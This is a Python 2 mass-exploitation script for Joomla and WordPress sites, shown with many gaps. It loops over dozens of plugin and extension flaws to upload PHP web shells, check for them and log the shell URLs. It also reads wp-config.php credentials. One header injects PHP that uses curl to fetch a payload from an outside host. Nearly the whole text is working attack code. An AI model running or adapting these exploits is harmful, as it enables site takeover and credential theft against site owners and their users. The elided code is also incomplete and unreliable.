...
headersx = {
    ...
    'abspath': 'data:,<?php system("curl http://vuzobr.ru/modules/mod_allnews/tmpl/info.txt -o root.php"); ?>' }
...
def ExploitS(url):
    ...
    try:
        filenames = 'RxR__' + rand_str(5) + '.php'
        ...
        if 'Bigbang' in aaReflexlib.content:
            print '{}Joomla: {} {} : {}{} Joomla RCE     {}{} successfullyfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in fgGravkglib.content:
            print '{}Joomla: {} {} :  {}{} com_jce     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        PrivMethod = {
            'json': '{"fn":"folderRename","args":["/' + izshell + '","./vulns.php"]}' }
        ...
        if 'izocin' in VulnCheck.content:
            print '{}Joomla: {} {} :  {}{} com_jce Priv8    {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        zttappgravkg = {
            ...
            'view': 'upload' }
        zttGravkg = {
            'pic_upload': (com_jdownloads, open(com_jdownloads, 'rb'), 'multipart/form-data') }
        ...
        if 'izocin' in zttGravkglib.content:
            print '{}Joomla: {} {} :  {}{} com_jdownloads     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        zttappgravkg = {
            ...
            'view': 'upload' }
        zttGravkg = {
            'pic_upload': open(jjshell, 'rb') }
        zttGravkgreq = requests.post(url + '/index.php?option=com_jdownloads&Itemid=0&view=upload', data = zttappgravkg, files = zttGravkg)
        zttGravkglib = requests.get(url + '/images/jdownloads/screenshots/bot.php3.g')
        if 'izocin' in zttGravkglib.content:
            print '{}Joomla: {} {} :  {}{} com_jdownloads bypass     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        com_jd_up = {
            'file_upload': (filename1, shell_2, 'text/html'),
        ...
        appgravkg = {
            ...
            'Itemid': '0',
            'tableid': '0' }
        nGravreq = requests.post(url + '/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1', data = appgravkg, files = {
            'userfile': open(jceupshell, 'rb') })
        nxxGravreq = requests.post(url + '/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1', data = appgravkg, files = {
            'userfile': open(xccc, 'rb') })
        nxxxGravreq = requests.post(url + '/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1', data = appgravkg, files = {
            'userfile': open(xcccc, 'rb') })
        ...
        if 'Bigbang' in nGravlib.content:
            print '{}Joomla: {} {} :  {}{} com_fabrik old     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        aaReflexlib = requests.get(url + '/root.php?shell')
        if 'Bigbang' in aaReflexlib.content:
            print '{}Joomla: {} {} :  {}{} com_fabrik new     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', aaReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        xxcvbappgrav = {
            'path': '/../../../' }
        xxcvbGrav = {
            'raw_data': (zino, shell_2, 'text/html') }
        ...
        if 'Bigbang' in xaynzfeReflexlib.content:
            print '{}Joomla: {} {} :  {}{} com_oziogallery     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in axaynzfeReflexlib.content:
            print '{}Joomla: {} {} :  {}{} com_oziogallery2     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in xaxaynzfeReflexlib.content:
            print '{}Joomla: {} {} :  {}{} com_oziogallery bypass     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in aReflexlib.content:
            print '{}Joomla: {} {} :  {}{} com_jbcatalog     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        com_myb = {
            'uploadfile': (image_myblog, shell_2) }
        ...
        appgrav = {
            'name': 'root.php' }
        Grav = {
            'file': (filename, shell_2, 'text/html') }
        ...
        if 'Bigbang' in Gravlib.content:
            print '{}Joomla: {} {} :  {}{} com_adsmanager     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        Gravreq = requests.post(url + '/index.php?option=com_adsmanager&task=upload&tmpl=component', data = {
            'name': 'root.php' }, files = {
            'file': (izshell, shell_2, 'text/html') })
        xxGravreq = requests.post(url + '/index.php?option=com_adsmanager&task=upload&tmpl=component', data = {
            'name': 'root.phP' }, files = {
            'file': (izshell, shell_2, 'text/html') })
        xxxGravreq = requests.post(url + '/index.php?option=com_adsmanager&task=upload&tmpl=component', data = {
            'name': 'root.phtml' }, files = {
            'file': (izshell, shell_2, 'text/html') })
        Gravlib = requests.get(url + '/tmp/plupload/root.php?bang')
        xxGravlib = requests.get(url + '/tmp/plupload/root.phP?bang')
        xxxGravlib = requests.get(url + '/tmp/plupload/root.phtml?bang')
        if 'Bigbang' in Gravlib.content:
            print '{}Joomla: {} {} :  {}{} com_adsmanager2     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', Gravlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in Gravklib.content:
            print '{}Joomla: {} {} :  {}{} com_b2jcontact     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in lGravklib.content:
            print '{}Joomla: {} {} :  {}{} com_b2jcontact 2     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in Reflexlib.content:
            print '{}Joomla: {} {} :  {}{} com_sexycontactform     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if "{error: 'No file" in check_myblog.content:
            ...
            com_myb = {
                'fileToUpload': (image_myblog, shell_2) }
        ...
        bappgrav = {
            'jpath': '..%2F..%2F..%2F..%2F' }
        bGrav = {
            'Filedata': (zat, shell_2, 'text/html') }
        ...
        if 'Bigbang' in bGravlib.content:
            print '{}Joomla: {} {} :  {}{} com_rokdownloads     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in dsbGravlib.content:
            print '{}Joomla: {} {} :  {}{} com_simplephotogallery     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in cbGravlib.content:
            print '{}Joomla: {} {} :  {}{} com_extplorer     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in cbGravlib.content:
            print '{}Joomla: {} {} :  {}{} mega menu     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', cbGravlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in eReflexlib.content:
            print '{}Joomla: {} {} :  {}{} mod_simplefileupload     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in feReflexlib.content:
            print '{}Joomla: {} {} :  {}{} com_bt_portfolio     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in zfeReflexlib.content:
            print '{}Joomla: {} {} :  {}{} com_jwallpapers     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in dzfeReflexlib.content:
            print '{}Joomla: {} {} :  {}{} com_redmystic     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in nzfeReflexlib.content:
            print '{}Joomla: {} {} :  {}{} com_facileforms     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in wGravklib.content:
            print '{}Joomla: {} {} :  {}{} com_civicrm     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in ewGravklib.content:
            print '{}Joomla: {} {} :  {}{} com_maian15     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in awGravklib.content:
            print '{}Joomla: {} {} :  {}{} com_acymailing     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in dawGravklib.content:
            print '{}Joomla: {} {} :  {}{} com_jnewsletter     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in xdawGravklib.content:
            print '{}Joomla: {} {} :  {}{} com_jinc     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in zxdawGravklib.content:
            print '{}Joomla: {} {} :  {}{} com_maianmedia     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in mzxdawGravklib.content:
            print '{}Joomla: {} {} :  {}{} com_jnews     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'JConfig' in xcrevlib.content:
            print '{}Joomla: {} {} :  {}{} com_hdflvplayer     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'JConfig' in aaxcrevlib.content:
            print '{}Joomla: {} {} :  {}{} jat3action     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'JConfig' in Caaxcrevlib.content:
            print '{}Joomla: {} {} :  {}{} mod_dvfoldercontent     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'JConfig' in aCaaxcrevlib.content:
            print '{}Joomla: {} {} :  {}{} jw_allvideos     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'JConfig' in daCaaxcrevlib.content:
            print '{}Joomla: {} {} :  {}{} com_product_modul     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'JConfig' in xdaCaaxcrevlib.content:
            print '{}Joomla: {} {} :  {}{} com_cckjseblod     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'JConfig' in rxdaCaaxcrevlib.content:
            print '{}Joomla: {} {} :  {}{} com_contushdvideoshare     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'JConfig' in trxdaCaaxcrevlib.content:
            print '{}Joomla: {} {} :  {}{} com_community     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'JConfig' in yrxdaCaaxcrevlib.content:
            print '{}Joomla: {} {} :  {}{} com_aceftp     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'JConfig' in ayrxdaCaaxcrevlib.content:
            print '{}Joomla: {} {} :  {}{} s5_media_player     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'JConfig' in cayrxdaCaaxcrevlib.content:
            print '{}Joomla: {} {} :  {}{} com_joomanager     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'JConfig' in rcayrxdaCaaxcrevlib.content:
            print '{}Joomla: {} {} :  {}{} wddownload     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'JConfig' in nncayrxdaCaaxcrevlib.content:
            print '{}Joomla: {} {} :  {}{} com_k2     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'JConfig' in zrcayrxdaCaaxcrevlib.content:
            print '{}Joomla: {} {} :  {}{} com_macgallery     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Uname' in anGravlib.content:
            print '{}Joomla: {} {} :  {}{} Shell     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
...
def wpsbot(url):
    ...
    try:
        ...
        if 'logout' in zzzazirevlib.content:
            print '{}Wordpress: {} {} :  {}{} UserPro Bypass     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        Gravkg = {
            'Filedata': (filename, shell_2, 'text/html') }
        ...
        if 'Bigbang' in Gravkglib.content:
            print '{}Wordpress: {} {} :  {}{} qualifire     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in ddGravkglib.content:
            print '{}Wordpress: {} {} :  {}{} woocommerce 0day     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        cisabo = {
            'uploadfile': (filecl, shell_2, 'text/html') }
        mmcizo = requests.post(url + '/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-black/designit/cs/upload.php', data = {
            'value': './' }, files = cisabo)
        ...
        if 'Bigbang' in misonzslib.content:
            print '{}Wordpress: {} {} :  {}{} woocommerce-custom-t-shirt     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        revsliderup = {
            'update_file': (filenames, shell_2, 'text/html') }
        ...
        if 'Bigbang' in revsliderlib.content:
            print '{}Wordpress: {} {} :  {}{} Revslider News     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        revsliderapp = {
            ...
            'client_action': 'update_plugin' }
        revsliderup = {
            'update_file': open('../../tool/izo.zip', 'rb') }
        revslidereq = requests.post(url + '/wp-admin/admin-ajax.php', data = revsliderapp, files = revsliderup)
        revsliderlib = requests.get(url + '/wp-content/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
        if 'Bigbang' in revsliderlib.content:
            print '{}Wordpress: {} {} :  {}{} Revslider Old     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', revsliderlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in revsliderlib.content:
            print '{}Wordpress: {} {} :  {}{} Avada     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', revsliderlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in revsliderlib.content:
            print '{}Wordpress: {} {} :  {}{} striking     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', revsliderlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in revsliderlib.content:
            print '{}Wordpress: {} {} :  {}{} IncredibleWP     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', revsliderlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in revsliderlib.content:
            print '{}Wordpress: {} {} :  {}{} ultimatum     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', revsliderlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in revsliderlib.content:
            print '{}Wordpress: {} {} :  {}{} medicate     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', revsliderlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in revsliderlib.content:
            print '{}Wordpress: {} {} :  {}{} centum     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', revsliderlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'izocin' in revsliderlib.content:
            print '{}Wordpress: {} {} :  {}{} beach_apollo     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', revsliderlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in revsliderlib.content:
            print '{}Wordpress: {} {} :  {}{} cuckootap     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', revsliderlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in revsliderlib.content:
            print '{}Wordpress: {} {} :  {}{} pindol     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', revsliderlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in revsliderlib.content:
            print '{}Wordpress: {} {} :  {}{} designplus     {}{}  upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', revsliderlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in revsliderlib.content:
            print '{}Wordpress: {} {} :  {}{} rarebird     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', revsliderlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in revsliderlib.content:
            print '{}Wordpress: {} {} :  {}{} andre     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', revsliderlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        aaReflexup = {
            'Filedata': (filenames, shell_2, 'text/html') }
        ...
        if 'Bigbang' in aaReflexlib.content:
            print '{}Wordpress: {} {} :  {}{} Coldfusion     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', aaReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        aReflexup = {
            'qqfile': (filenames, shell_2, 'text/html') }
        ...
        if 'Bigbang' in aReflexlib.content:
            print '{}Wordpress: {} {} :  {}{} magic-fields     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', aReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}Wordpress: {} {} :  {}{} Ghost     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in Gravlib.content:
            print '{}Wordpress: {} {} :  {}{} Gravity     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', Gravlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in Gravlib.content:
            print '{}Wordpress: {} {} : {}{} Gravity php    {}{} successfullyfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', Gravlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        appgravk = {
            'config_path': '../../../../../../' }
        Gravk = {
            'image': (filename, shell_2, 'text/html') }
        ...
        if 'Bigbang' in Gravklib.content:
            print '{}Wordpress: {} {} : {}{} networking-e-commerce     {}{} successfullyfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', Gravklib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in showbizlib.content:
            print '{}Wordpress: {} {} : {}{} Showbiz     {}{} successfullyfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Bigbang' in Reflexlib.content:
            print '{}Wordpress: {} {} : {}{} Reflex Gallery     {}{} successfullyfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', Reflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        Wysijaup = {
            'my-theme': open('../../tool/Master.zip', 'rb') }
        Wysijaapp = {
            'action': 'themeupload',
            'submitter': 'Upload',
        ...
        if 'Bigbang' in Wysijalib.content:
            print '{}Wordpress: {} {} : {}{} Wysija     {}{} successfullyfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Uname' in banGravlib.content:
            print '{}Wordpress: {} {} :  {}{} Shell     {}{} successfullyfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write(url + '/shell.php' + '\n')
            sys.exit()
        elif 'Uname' in banxxGravlib.content:
            print '{}Wordpress: {} {} :  {}{} Shell     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        LearnDashup = {
            'uploadfiles[]': (filenamex, shell, 'text/html') }
        LearnDashreq = requests.post(url, files = LearnDashup, data = {
            'post': 'foobar',
            'course_id': 'foobar',
            'uploadfile': 'foobar' })
        ...
        if 'izocin' in LearnDashlib.content:
            print '{}Wordpress: {} {} :  {}{} LearnDash     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        Tevoup = {
            'file': (filenames, shell, 'text/html') }
        ...
        if 'izocin' in Tevorlib.content:
            print '{}Wordpress: {} {} :  {}{} Tevolution     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'izocin' in zTevorlib.content:
            print '{}Wordpress: {} {} :  {}{} pagelines     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'izocin' in Cherrylib.content:
            print '{}Wordpress: {} {} :  {}{} Cherry     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'DB_USER' in revlib.content:
            print '{}Wordpress: {} {} :  {}{} Revslider Config     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'DB_USER' in revlib.content:
            print '{}Wordpress: {} {} :  {}{} Wp-ecommerce Config     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Config.txt', 'a').write(url + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php' + '\n')
        else:
            print '{}Wordpress: {} {} :  {}{} Wp-ecommerce Config     {}{} Failed  '.format(sb, sd, url, fc, fc, sb, fr)
        propertyup = {
            'Filedata': (filenames, shell, 'text/html') }
        ...
        if 'izocin' in propertylib.content:
            print '{}Wordpress: {} {} :  {}{} wp-property     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        mzoo = {
            'action': 'upload_ad_imag',
            'path': '' }
        simpleup = {
            'uploadfile': (filenames, shell, 'text/html') }
        ...
        if 'izocin' in simplelib.content:
            print '{}Wordpress: {} {} :  {}{} ads-manager     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        dayi = {
            'file_field': (filevid, shell_2, 'text/html') }
        ...
        if 'Bigbang' in dayilib.content:
            print '{}Wordpress: {} {} :  {}{} dzs-videogallery     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        basbe = {
            'value': './' }
        sabo = {
            'uploadfile': (filecl, shell, 'text/html') }
        ...
        if 'izocin' in sonlib.content:
            print '{}Wordpress: {} {} :  {}{} clackstone     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        eptonicup = {
            'qqfile': (filenames, shell, 'text/html') }
        ...
        if 'izocin' in eptoniclib.content:
            print '{}Wordpress: {} {} :  {}{} eptonic     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write(url + '/wp-content/uploads/2018/08/' + filenames + '\n')
            sys.exit()
        else:
        ...
        if 'izocin' in saicolib.content:
            print '{}Wordpress: {} {} :  {}{} saico     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write(url + '/wp-content/uploads/2018/08/' + filenames + '\n')
            sys.exit()
        else:
        ...
        if 'izocin' in barclaycartlib.content:
            print '{}Wordpress: {} {} :  {}{} barclaycart     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        sexyup = {
            'files[]': (filenames, shell, 'text/html') }
        ...
        if 'izocin' in sexylib.content:
            print '{}Wordpress: {} {} :  {}{} sexy-contact-form     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'izocin' in pinboardlib.content:
            print '{}Wordpress: {} {} :  {}{} pinboard     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'izocin' in pitchprintlib.content:
            print '{}Wordpress: {} {} :  {}{} pitchprint     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write(url + '/wp-content/uploads/2018/08/' + filenames + '\n')
            sys.exit()
        else:
        ...
        if 'izocin' in evolvelib.content:
            print '{}Wordpress: {} {} :  {}{} evolve     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write(url + '/wp-content/uploads/2018/08/' + filenames + '\n')
            sys.exit()
        else:
        ...
        if 'izocin' in satoshilib.content:
            print '{}Wordpress: {} {} :  {}{} satoshi     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write(url + '/wp-content/uploads/2018/08/' + filenames + '\n')
            sys.exit()
        else:
        ...
        if 'izocin' in dandelionlib.content:
            print '{}Wordpress: {} {} :  {}{} dandelion     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write(url + '/wp-content/uploads/2018/08/' + filenames + '\n')
            sys.exit()
        else:
        ...
        if 'izocin' in highlightlib.content:
            print '{}Wordpress: {} {} :  {}{} highlight     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write(url + '/wp-content/uploads/2018/08/' + filenames + '\n')
            sys.exit()
        else:
        ...
        if 'izocin' in ithemeslib.content:
            print '{}Wordpress: {} {} :  {}{} ithemes2     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'izocin' in customlib.content:
            print '{}Wordpress: {} {} :  {}{} custom-background     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'izocin' in zxcustomlib.content:
            print '{}Wordpress: {} {} :  {}{} jssor-slider     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'izocin' in ampluslib.content:
            print '{}Wordpress: {} {} :  {}{} amplus     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        cnhkup = {
            'slideshow': (filenames, shell, 'text/html') }
        ...
        if 'izocin' in cnhklib.content:
            print '{}Wordpress: {} {} :  {}{} cnhk-slideshow     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'izocin' in assetlib.content:
            print '{}Wordpress: {} {} :  {}{} asset-manager     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'izocin' in sonzlib.content:
            print '{}Wordpress: {} {} :  {}{} private-conversation     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'izocin' in cubedslib.content:
            print '{}Wordpress: {} {} :  {}{} cubed_v1.2     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write(url + '/wp-content/uploads/2018/08/' + filenames + '\n')
            sys.exit()
        else:
        ...
        if 'izocin' in flipbooklib.content:
            print '{}Wordpress: {} {} :  {}{} flipbook     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'izocin' in wpstorelib.content:
            print '{}Wordpress: {} {} :  {}{} wpstorecart     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'izocin' in dancelib.content:
            print '{}Wordpress: {} {} :  {}{} dance-studio     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'izocin' in designlib.content:
            print '{}Wordpress: {} {} :  {}{} u-design     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        wpshopup = {
            'wpshop_file': (filenames, shell, 'text/html') }
        ...
        if 'izocin' in wpshoplib.content:
            print '{}Wordpress: {} {} :  {}{} wpshop     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write(url + '/wp-content/uploads/' + filenames + '\n')
            sys.exit()
        else:
            print '{}Wordpress: {} {} :  {}{} wpshop    {}{} Failed  '.format(sb, sd, url, fc, fc, sb, fr)
        symposiumup = {
            'fileToUpload': (filenames, shell, 'text/html') }
        ...
        if 'izocin' in symposiumlib.content:
            print '{}Wordpress: {} {} :  {}{} wp-symposium     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write(url + '/wp-content/uploads/' + filenames + '\n')
            sys.exit()
        else:
        ...
        if 'izocin' in formcraftlib.content:
            print '{}Wordpress: {} {} :  {}{} formcraft     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'izocin' in picalib.content:
            print '{}Wordpress: {} {} :  {}{} pica-photo-gallery     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'izocin' in sonzslib.content:
            print '{}Wordpress: {} {} :  {}{} N-media contact     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'DB_USER' in conflib.content:
            print '{}Wordpress: {} {} :  {}{} membership-simplified     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'DB_USER' in confrlib.content:
